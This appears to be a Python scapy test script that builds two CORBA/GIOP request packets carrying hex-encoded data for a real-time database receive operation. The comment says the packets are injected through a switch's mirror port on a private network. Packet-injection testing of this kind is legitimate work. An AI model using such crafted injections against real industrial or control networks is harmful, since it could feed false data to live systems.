from scapy.layers.inet import *
from scapy.arch.pcapdnet import L3pcapSocket
from protocols.packet_giop import *


class TestFangJiaShan(object):
    def __init__(self):
        pass

    # 通过OWP所接交换机的镜像端口，向网络注入数据包
    def test_owp_len246(self):
        pkt246 = IP(src='192.168.69.111', dst='192.168.69.201') / TCP(dport=19220) / \
                 GIOP(type='Request',
                      RequestID=56789,
                      KeyAddress=h2b('14010f005253544da8825f9b040f00030000000100000004000000'),
                      RequestOperation='idl_rcv_rdb_receive_data',
                      StubData=h2b('870000000200000000000100440000009e00000005002b020002070100000000000'
                                   '0c0420004a000000000000000000000000200000000000000c84246312020202020'
                                   '2020202020202020202020202020202020'))
        pkt426 = IP(src='192.168.69.111', dst='192.168.69.201') / TCP(dport=19470) / \
                 GIOP(type='Request',
                      RequestID=56791,
                      KeyAddress=h2b('14010f005253544ea8825fb7640200030000000100000004000000'),
                      RequestOperation='idl_rcv_rdb_receive_data',
                      StubData=h2b('8b0000000200000000000100f8000000fa00000005002a020002c20000000000000'
                                   '0000000000000000000000000c842ffff7fffffff7f7fffff7fffffff7f7fffff7f'
                                   'ffffff7f7fffff7fffffff7f7f25202020202020202020202020202020202020202'
                                   '0202020202020202020202020202020463120202020202020202020202020202020'
                                   '202020202020fb00000005002b020002c2000000000000000000000080420000000'
                                   '00000c842ffff7fffffff7f7fffff7fffffff7f7fffff7fffffff7f7fffff7fffff'
                                   'ff7f7f2520202020202020202020202020202020202020202020202020202020202'
                                   '02020202020463120202020202020202020202020202020202020202020'))
        l3socket = conf.L3socket(iface='以太网 2')
        l3socket.send(pkt246)
        l3socket.send(pkt426)
